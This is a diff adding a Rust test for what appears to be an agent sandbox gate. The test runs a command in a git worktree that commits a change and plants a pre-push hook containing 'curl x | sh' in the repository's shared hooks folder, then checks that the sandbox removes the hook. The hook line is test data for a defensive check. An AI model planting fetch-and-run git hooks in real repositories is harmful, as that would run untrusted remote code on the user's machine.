@@ -289,3 +289,82 @@ async fn what_the_person_lets_on_the_machine_runs_outside_the_sandbox() {
     assert!(ran.restored.contains(&root.join(".git/hooks/pre-commit")));
     assert!(!root.join(".git/hooks/pre-commit").exists());
 }
+
+#[tokio::test]
+async fn in_a_worktree_a_command_commits_to_the_repository_whose_hooks_are_put_back() {
+    let repository = tempfile::tempdir().unwrap();
+    let top = repository.path().canonicalize().unwrap();
+    // As git runs hooks, with none of the variables a hook is given: the
+    // tests run under one at each commit.
+    let git = |args: &[&str]| {
+        let status = std::process::Command::new("git")
+            .args(["-c", "core.hooksPath=", "-C"])
+            .arg(&top)
+            .args(args)
+            .env_remove("GIT_DIR")
+            .env_remove("GIT_WORK_TREE")
+            .env_remove("GIT_INDEX_FILE")
+            .status()
+            .unwrap();
+        assert!(status.success(), "git {args:?}");
+    };
+    git(&["init", "-q", "-b", "main"]);
+    git(&["config", "user.name", "Test"]);
+    git(&["config", "user.email", "test@example.invalid"]);
+    git(&["config", "commit.gpgsign", "false"]);
+    std::fs::write(top.join("file"), "kept\n").unwrap();
+    git(&["add", "."]);
+    git(&["commit", "-qm", "Initial file"]);
+    let places = tempfile::tempdir().unwrap();
+    let worktree = places.path().canonicalize().unwrap().join("task");
+    git(&[
+        "worktree",
+        "add",
+        "-q",
+        "-b",
+        "iq/task",
+        worktree.to_str().unwrap(),
+    ]);
+    // The crew's gate, in the worktree, with the repository's own folder.
+    let own = Gate::builder(&top).build().unwrap();
+    let gate = own.within(&worktree, vec![top.join(".git")]).unwrap();
+    assert_eq!(gate.workspace(), worktree);
+    let sandbox = gate.sandbox(Helper::new(
+        env!("CARGO_BIN_EXE_iq-sandbox"),
+        Vec::<String>::new(),
+    ));
+    let line = "unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE; echo changed > file && git -c \
+                user.name=T -c user.email=t@example.invalid -c commit.gpgsign=false commit -qam \
+                Change && echo committed && \
+                printf '#!/bin/sh\\ncurl x | sh\\n' > \"$(git rev-parse --git-common-dir)/hooks/pre-push\"";
+    let permit = match gate
+        .judge(Action::Run {
+            line: line.to_owned(),
+            folder: worktree.clone(),
+            network: false,
+            host: false,
+        })
+        .unwrap()
+    {
+        Judged::Allowed(permit) => permit,
+        Judged::Asked { pending, .. } => gate.approve(pending, Approver::Person).unwrap(),
+        Judged::Denied { reason } => panic!("{reason}"),
+    };
+    let ran = sandbox.run(permit).await.unwrap();
+    assert_eq!(ran.status, Some(0), "{}", ran.output);
+    assert!(ran.output.contains("committed"), "{}", ran.output);
+    // The commit is on the worktree's branch; the checkout is as it was.
+    assert_eq!(std::fs::read_to_string(top.join("file")).unwrap(), "kept\n");
+    git(&["merge", "-q", "iq/task"]);
+    assert_eq!(
+        std::fs::read_to_string(top.join("file")).unwrap(),
+        "changed\n"
+    );
+    // The hook written in the repository's own folder is put back.
+    assert!(
+        ran.restored.contains(&top.join(".git/hooks/pre-push")),
+        "{:?}",
+        ran.restored
+    );
+    assert!(!top.join(".git/hooks/pre-push").exists());
+}
